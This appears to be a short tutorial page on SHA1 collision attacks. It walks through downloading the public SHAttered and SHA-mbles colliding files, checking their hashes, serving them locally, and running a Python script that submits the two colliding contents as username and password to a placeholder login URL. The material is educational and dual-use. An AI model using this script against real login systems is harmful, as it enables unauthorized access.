---
title: SHA1 Hash Collision Attack
description: Basic reconnaisance flows.
tags:
    - Cryptography
refs:
    - https://shattered.io/
    - https://sha-mbles.github.io/
date: 2023-02-01
draft: false
---

## Sample Attacks

### 1. Download two Files

There are several ways to download files. So we can select our desired files as purposes.

- Download the original two PDF files in [SHAttered](https://shattered.io/).
- Download two custom Files (e.g. messageA and messageB) in [Chosen-Prefix Collision Example](https://sha-mbles.github.io/).

Check if the SHA1 hash is the same as each other.

```bash
sha1sum shattered-1.pdf
sha1sum shattered-2.pdf

sha1sum messageA
sha1sum messageB
```

### 2. Host the PDF Files Locally

In the directory where the two PDF files located, start local server for using in a Python script.

```bash
python3 -m http.server 8000
```

### 3. Create a Python Script

For example, create a “test.py”.

```python
import requests

file1 = "shattered-1.pdf"
file2 = "shattered-2.pdf"

pdf_1 = requests.get(f'http://localhost:8000/{file1}')
pdf_2 = requests.get(f'http://localhost:8000/{file2}')

# e.g. the two values can be used as username/password.
params = {'username': pdf_1.content, 'password': pdf_2.content}
r = requests.get('https://example.com/login', params=params)
print(r.text)
```

### 4. Run the Script

```bash
python3 test.py
```